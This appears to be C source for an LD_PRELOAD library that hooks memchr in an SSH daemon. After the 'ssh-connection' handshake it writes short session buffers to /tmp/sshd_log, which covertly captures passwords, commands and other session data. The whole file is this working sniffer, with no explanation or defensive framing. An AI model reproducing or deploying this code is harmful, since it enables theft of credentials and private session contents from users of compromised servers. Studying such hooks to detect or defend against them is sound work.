#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/types.h>

#define MAX_LOG_LENGTH 512
#ifndef LOG_LOCATION
 #define LOG_LOCATION "/tmp/sshd_log"
#endif

pid_t g_pid = 0;
char g_buf[128];
unsigned char active_session = 0;
static void* (*memchr_hook)(const void *src, int chr, size_t n) = NULL;

void* memchr(const void* src, int chr, size_t n) {
    FILE* log;
    void* ret;

    // Call original memchr function
    if (memchr_hook == NULL) {
        memchr_hook = dlsym(RTLD_NEXT, "memchr");
    }
    ret = memchr_hook(src, chr, n);

    // Ignore ssh setup stuff and long lines
    if ( !active_session ) {
        if (strstr(src, "ssh-connection") != NULL) {
            active_session = 1;
        }
        return ret;
    }
    else if (n > MAX_LOG_LENGTH) {
        return ret;
    }

    // Just nice for logging output
    if (g_pid == 0) {
        g_pid = getpid();
        snprintf(g_buf, sizeof(g_buf), "\n[%d]", g_pid);
    }

    // Log the data
    if (chr == '\0') {
        log = fopen(LOG_LOCATION, "a");
        if (log != NULL) {
            fwrite(g_buf, 1, strlen(g_buf), log);
            fwrite(src, 1, n, log);
            fclose(log);
        }
    }
    return ret;
}